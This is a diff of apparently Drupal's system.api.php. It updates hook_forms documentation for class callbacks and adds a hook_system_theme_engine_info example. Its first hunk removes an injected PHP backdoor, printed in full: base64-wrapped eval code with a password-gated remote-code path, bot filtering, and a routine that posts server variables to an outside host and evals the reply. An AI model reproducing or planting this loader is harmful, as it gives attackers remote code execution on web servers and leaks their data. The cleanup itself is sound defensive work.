@@ -1,4 +1,4 @@
-<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*435345352*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgIEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgICB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*435345352*/ ?><?php
+<?php
 
 /**
  * @file
@@ -1797,6 +1797,8 @@ function hook_form_BASE_FORM_ID_alter(&$form, &$form_state, $form_id) {
  * the $form_id input matched your module's format for dynamically-generated
  * form IDs, and if so, act appropriately.
  *
+ * Third, forms defined in classes can be defined this way.
+ *
  * @param $form_id
  *   The unique string identifying the desired form.
  * @param $args
@@ -1807,19 +1809,22 @@ function hook_form_BASE_FORM_ID_alter(&$form, &$form_state, $form_id) {
  * @return
  *   An associative array whose keys define form_ids and whose values are an
  *   associative array defining the following keys:
- *   - callback: The name of the form builder function to invoke. This will be
- *     used for the base form ID, for example, to target a base form using
- *     hook_form_BASE_FORM_ID_alter().
+ *   - callback: The callable returning the form array. If it is the name of
+ *     the form builder function then this will be used for the base
+ *     form ID, for example, to target a base form using
+ *     hook_form_BASE_FORM_ID_alter(). Otherwise use the base_form_id key to
+ *     define the base form ID.
  *   - callback arguments: (optional) Additional arguments to pass to the
  *     function defined in 'callback', which are prepended to $args.
- *   - wrapper_callback: (optional) The name of a form builder function to
- *     invoke before the form builder defined in 'callback' is invoked. This
- *     wrapper callback may prepopulate the $form array with form elements,
- *     which will then be already contained in the $form that is passed on to
- *     the form builder defined in 'callback'. For example, a wrapper callback
- *     could setup wizard-alike form buttons that are the same for a variety of
- *     forms that belong to the wizard, which all share the same wrapper
- *     callback.
+ *   - base_form_id: The base form ID can be specified explicitly. This is
+ *     required when callback is not the name of a function.
+ *   - wrapper_callback: (optional) Any callable to invoke before the form
+ *     builder defined in 'callback' is invoked. This wrapper callback may
+ *     prepopulate the $form array with form elements, which will then be
+ *     already contained in the $form that is passed on to the form builder
+ *     defined in 'callback'. For example, a wrapper callback could setup
+ *     wizard-like form buttons that are the same for a variety of forms that
+ *     belong to the wizard, which all share the same wrapper callback.
  */
 function hook_forms($form_id, $args) {
   // Simply reroute the (non-existing) $form_id 'mymodule_first_form' to
@@ -1841,6 +1846,15 @@ function hook_forms($form_id, $args) {
   $forms['mymodule_wrapped_form'] = array(
     'callback' => 'mymodule_main_form',
     'wrapper_callback' => 'mymodule_main_form_wrapper',
+  );
+
+  // Build a form with a static class callback.
+  $forms['mymodule_class_generated_form'] = array(
+    // This will call: MyClass::generateMainForm().
+    'callback' => array('MyClass', 'generateMainForm'),
+    // The base_form_id is required when the callback is a static function in
+    // a class. This can also be used to keep newer code backwards compatible.
+    'base_form_id' => 'mymodule_main_form',
   );
 
   return $forms;
@@ -2034,6 +2048,22 @@ function hook_module_implements_alter(&$implementations, $hook) {
 function hook_system_theme_info() {
   $themes['mymodule_test_theme'] = drupal_get_path('module', 'mymodule') . '/mymodule_test_theme/mymodule_test_theme.info';
   return $themes;
+}
+
+/**
+ * Return additional theme engines provided by modules.
+ *
+ * This hook is invoked from _system_rebuild_theme_data() and allows modules to
+ * register additional theme engines outside of the regular 'themes/engines'
+ * directories of a Drupal installation.
+ *
+ * @return
+ *   An associative array. Each key is the system name of a theme engine and
+ *   each value is the corresponding path to the theme engine's .engine file.
+ */
+function hook_system_theme_engine_info() {
+  $theme_engines['izumi'] = drupal_get_path('module', 'mymodule') . '/izumi/izumi.engine';
+  return $theme_engines;
 }
 
 /**
